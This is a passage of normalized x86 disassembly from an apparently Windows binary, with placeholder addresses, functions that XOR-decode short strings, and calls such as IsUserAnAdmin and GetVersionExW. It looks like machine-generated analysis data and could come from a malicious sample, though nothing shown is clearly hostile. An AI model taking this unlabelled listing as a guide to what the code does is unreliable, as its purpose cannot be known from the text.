lea edx [ ebp - 0x3c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f5d0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1000ec78
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_1004879e
add esi 0x2
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1000ecb0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x69
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8f
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f5d0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f5d0
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x1c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f5d0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1000ee60
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x78
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_1000ee90
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_10035d06
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_10034c90
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1000eee0
push ebp
mov ebp esp
sub esp 0x764
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x748 ] esi
mov [ ebp - 0x744 ] ebx
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x74c ]
mov eax 0x1
call sub_10012e10
lea edx [ ebp - 0x73c ]
mov eax 0x4
call sub_10012e10
lea edx [ ebp - 0x740 ]
mov eax 0x3
call sub_10012e10
mov eax edx
push eax
push edi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x210 ]
test eax eax
mov edx 0x104
mov eax ecx
je r-xdata
mov esi edi
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x73c ]
xor esi esi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test esi esi
je r-xdata
sub eax 0x2
mov esi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov edi [ ebp - 0x748 ]
lea eax [ ebp - 0x740 ]
push eax
push edi
call [ StrStrW@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x620 ]
test eax eax
mov edx 0x208
mov eax ecx
je r-xdata
lea eax [ edx + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ edx + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov esi edi
sub esi ecx
lea esi [ ebp - 0x73c ]
sub esi ecx
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_1004e6c0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x74c ]
push eax
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ edx + 0xb ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_1004e6c0
test eax eax
je r-xdata
lea eax [ edx + 0x8 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x740 ]
push ecx
lea ebx [ ebp - 0x620 ]
call sub_1004e6c0
test eax eax
je r-xdata
mov eax 0xc
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x620 ]
call sub_1004e6c0
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
lea ebx [ ebp - 0x620 ]
call sub_1004e6c0
test eax eax
je r-xdata
mov eax 0xd
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x114
lea eax [ ebp - 0x738 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
lea ecx [ ebp - 0x738 ]
push ecx
mov [ ebp - 0x738 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x734 ] 0x6
jae r-xdata
mov eax 0xe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x210 ]
call sub_100263d0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
call [ GetTickCount@IAT ]
push eax
call sub_1001d9e3
add esp 0x4
call sub_1001cd91
xor edx edx
mov ecx 0xa
div ecx
add edx 0x3
push edx
call sub_100183d0
lea esi [ ebp - 0x760 ]
mov ebx eax
mov [ ebp - 0x760 ] 0x0
call sub_100129a0
test eax eax
jne r-xdata
mov edx [ ebp - 0x744 ]
push edx
call sub_1001f8d0
test eax eax
je r-xdata
lea edi [ ebp - 0x620 ]
lea ecx [ ebp - 0x210 ]
lea esi [ ebp - 0x760 ]
call sub_10067c00
test eax eax
je r-xdata
mov eax 0xf
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_100388f0
test eax eax
je r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_10006c60
test eax eax
je r-xdata
mov eax 0x11
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
call sub_100187af
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x12
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1000f3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089d9d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10057a60
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10037e00
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1003e830
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10057800
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10041240
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000be00
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_1002d84e
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_1005e580
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_1002d84e
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10041240
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100403d0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1000be00
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_1005e580
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_1002d84e
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10044960
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_1004efe0
push esi
push ebx
call sub_10003290
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_100187af
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_100187af
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10028f80
mov eax [ ebp - 0x120 ]
push eax
call sub_100187af
add esp 0x14
sub_1000fc20
push ebp
mov ebp esp
push 0xffffffff
push sub_1008643b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1000fcd9
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10041a47
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1006299d
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1006299d
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_10017e52
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_10057f6e
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_100532c3
pop ecx
test eax eax
jne r-xdata
call sub_10017e52
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10057f6e
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_100109dd
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_10005a0c
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
